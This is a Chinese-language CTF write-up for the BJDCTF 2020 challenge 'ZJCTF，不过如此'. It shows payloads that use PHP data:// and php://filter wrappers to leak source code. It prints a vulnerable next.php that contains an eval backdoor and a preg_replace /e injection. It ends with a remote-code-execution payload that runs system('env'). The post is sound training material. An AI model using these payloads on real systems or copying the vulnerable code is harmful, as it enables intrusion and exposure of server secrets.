---
date: 2024-05-26
categories: 
    - BJDCTF
tag:
    - CTF
    - RCE
    - PHP
    - php伪协议 
    - 正则
---

# 每日一题 —— [BJDCTF 2020]ZJCTF，不过如此

> 题目地址： <https://www.nssctf.cn/problem/717>   

<!-- more -->

## index.php

第一步是白盒，观察代码，发现我们要传入两个参数，一个是 `text`，一个是 `file`。为了让我们能够成功包含 `next.php`， 我们需要满足函数 `file_get_contents` 可以从 `text` 参数中作为文件读取数据。我们使用 `data` 伪协议传入数据：


```
?text=data://text/plain,I%20have%20a%20dream
```

然后，我们通过同样的方法将 `next.php` 给包含进来。为了防止该 php 文件被解析，我们使用同样的方法包含这个文件，那么在该 `index.php` 文件下，最终 payload 为：

```
?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php
```

将得到的 base64 数据丢进 CyberChef 中得到 `next.php` 的源代码：

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}
```

## next.php

现在转到 `next.php` 文件，一片空白需要我们传参。注意到有一个 `getFlag()` 方法调用了一句话木马，但是主程序并没有入口调用它。观察到主程序调用了 `complex` 函数，而 `complex` 函数调用了 `preg_replace` 函数。注意到其中的正则表达式中有一个 `e` 修饰符，经过搜索，发现它是 php 已废弃的修饰符，会调用 `eval` 方法并执行第二个参数 —— `replacement` 的内容。因此从此入手。

解析 `preg_replace` 函数，发现它扫描每一个 GET 的键值对，将 key 作为扫描的字符串，包裹上小括号并传递给第二个参数。此步骤是正则表达式的反向引用。而 `\\1` 就代表读取此前扫描字符串中第一个小括号包裹的内容。总结就是：对于传入的每一个键值对，此函数会操作该 `value` ，将 `key` 作为扫描字符串并替换为 `strtolower(key)` 。此函数会执行 `key` 参数，并认为 `key` 为一个普通的字符串。

观察到 `\\1` 周围包裹的为双引号，此引号内会解析变量，并且变量内部可以执行一个函数命令。那么构造该键值对： `\S*=${getFlag()}` 其中，`\S*` 代表所有字符组成的字符串，可以包括 `value` 中的所有信息。而 `${getFlag()}` 则会在解析变量的时候运行危险后门函数。因此同时我们就可以通过 `cmd` 参数实现 RCE。

最终 payload：

```
next.php?\S*=${getFlag()}&cmd=system('env');
```

在输出中发现环境变量有 `FLAG` 变量。

---
ps: 不知道为什么，无论是 `\S*` 参数还是 `cmd` 参数，都无法直接运行 `phpinfo()` 函数，只要运行就会爆“连接已重置”的问题。不知道这个是服务器问题还是我的问题，毕竟别的函数都是可以使用的。